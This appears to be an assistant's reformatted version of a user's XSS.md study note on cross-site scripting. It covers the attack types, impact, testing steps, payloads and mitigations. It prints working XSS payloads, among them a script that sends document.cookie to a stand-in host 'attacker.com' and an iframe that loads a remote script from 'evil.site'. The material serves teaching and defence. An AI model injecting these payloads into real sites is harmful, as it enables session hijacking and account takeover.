Here's the enhanced and spell-checked version of your `XSS.md` file with improved formatting:

```markdown
# 🎯 Cross-Site Scripting (XSS) 
*Web vulnerability where attackers inject malicious scripts into trusted websites*

---

## 📖 Table of Contents
- [📜 Definition](#-definition)
- [🔀 Types of XSS](#-types-of-xss)
- [💥 Impact](#-impact)
- [🔍 Testing Methodology](#-testing-methodology)
- [📌 Common Payloads](#-common-payloads)
- [📚 Resources](#-resources)

---

## 📜 Definition
XSS (Cross-Site Scripting) is an injection vulnerability where attackers execute malicious JavaScript in a victim's browser, often for:
- Session hijacking 🕵️
- Phishing attacks 🎣
- Defacement 🏴

---

## 🔀 Types of XSS

| Type              | Description                                                                 | Risk Level |  
|--------------------|-----------------------------------------------------------------------------|------------|  
| **🔄 Stored XSS**   | Malicious script is **stored** on the server (e.g., comments/user profiles). Executes when victims view infected pages. | Critical   |  
| **🎯 Reflected XSS**| Script is **reflected** in immediate server responses (e.g., search results). Requires social engineering.             | High       |  
| **🌐 DOM-based XSS**| Client-side attack exploiting unsafe JavaScript DOM manipulation. No server interaction.                              | High       |  

---

## 💥 Impact
- **Cookie/session theft** 🍪  
- **Account takeover** 👑  
- **Keylogging** ⌨️  
- **Content spoofing** 🎭  
- **Redirection to malicious sites** ➡️ 

---

## 🔍 Testing Methodology
1. **Identify Input Points**:  
   - Search bars 🔍  
   - Comment sections 💬  
   - User profiles (bio/username) 👤  
   - URL parameters (e.g., `?id=<payload>`) 🌐  

2. **Test for Reflection**:  
   - Inject a unique string (e.g., `cupcakes123`) and check:  
     - Page content 🔎  
     - HTML source code (`Ctrl+U`) 📄  
     - Network responses (DevTools) 🌐  

3. **Escalate with Payloads**:  
   ```html
   <script>alert(1)</script>                 <!-- Classic test -->
   <img src=x onerror="alert(document.cookie)">  <!-- Cookie theft demo -->
   ```

---

## 📌 Common Payloads
### Basic Tests
```html
<script>alert(1)</script>
"><svg/onload=confirm(1)>
```

### Advanced Attacks
```html
<!-- Steal cookies -->
<script>fetch('https://attacker.com?cookie='+document.cookie)</script>

<!-- Redirect to phishing site -->
<iframe src="javascript:document.write('<script src=//evil.site/xss.js></script>')">
```

📖 Full Cheat Sheet: [XSS Payload Masterlist](https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45)

---

## 📚 Resources
| Resource | Description | Link |  
|----------|-------------|------|  
| **Beyond XSS** | Advanced exploitation techniques | [aszx87410.github.io](https://aszx87410.github.io/beyond-xss/en/) |  
| **PortSwigger Labs** | Hands-on XSS practice | [portswigger.net](https://portswigger.net/web-security/cross-site-scripting) |  
| **OWASP XSS Guide** | Defense strategies | [owasp.org](https://owasp.org/www-community/attacks/xss/) |  

---

## 🛡️ Mitigation
- **Sanitize Inputs**: Remove/escape HTML tags.  
- **Use CSP Headers**:  
  ```http
  Content-Security-Policy: default-src 'self'
  ```
- **Avoid Unsafe Functions**:  
  ```javascript
  // UNSAFE ❌
  element.innerHTML = userInput;
  
  // SAFE ✅
  element.textContent = userInput;
  ```

---
